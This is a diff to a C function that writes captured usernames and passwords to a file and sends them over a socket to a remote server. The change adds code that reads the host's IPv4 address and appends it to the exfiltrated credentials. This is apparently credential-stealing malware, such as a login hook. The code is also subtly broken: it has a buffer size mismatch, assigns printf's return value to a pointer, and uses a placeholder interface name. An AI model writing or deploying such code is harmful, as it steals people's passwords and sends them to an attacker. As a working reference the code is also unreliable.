@@ -1,5 +1,8 @@
 #include <sys/socket.h>
 #include <arpa/inet.h> 
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <net/if.h>
 #include <unistd.h> 
 #include <string.h> 
 #define PORT 
@@ -33,20 +36,32 @@ int writetofile (char *password){
 
         fprintf(fptr, "%s:%s\n", name, password);
             
+        // Get IP Address //
+        int fd;
+        struct ifreq ifr;
+        fd = socket(AF_INET, SOCK_DGRAM, 0);
+        
+        /* I want to get an IPv4 IP address */
+        ifr.ifr_addr.sa_family = AF_INET;
+
+        /* I want IP address attached to "eth0" */
+        strncpy(ifr.ifr_name, "#INT", IFNAMSIZ-1);
+        ioctl(fd, SIOCGIFADDR, &ifr);
+        close(fd);
+        
+        /* display result */
+        char buffer[256];
+        char * ip;
+        strcpy(user, name);
+        ip = printf("%s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
+        int j = snprintf(buffer, 1024, "%s:%s:%s\n", user, password, ip);
+        
         // // Send stuff // //
         // Make Socket
         int sock = 0, valread;
         struct sockaddr_in serv_addr;
-            
-        // Build String
-        strcpy(user, name);
-        msg = ("%s", password);
-        msg2 = ("%s:", user);
-        colon = ':';
-        strncat(msg2, &colon, 1);
-        strcat(msg2, msg);
 
-        char buffer[1024] = {0};
+
         fclose(fptr);
 
         // Error Handling
@@ -62,7 +77,6 @@ int writetofile (char *password){
         timeout.tv_usec = 0;
 
         if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
-
             return -1;
         }
             
@@ -80,7 +94,7 @@ int writetofile (char *password){
         }
 
         // Send Message
-        send(sock , msg2 , strlen(msg2) , 0 );
+        send(sock , buffer , strlen(buffer) , 0 );
         return 0;
     }
 
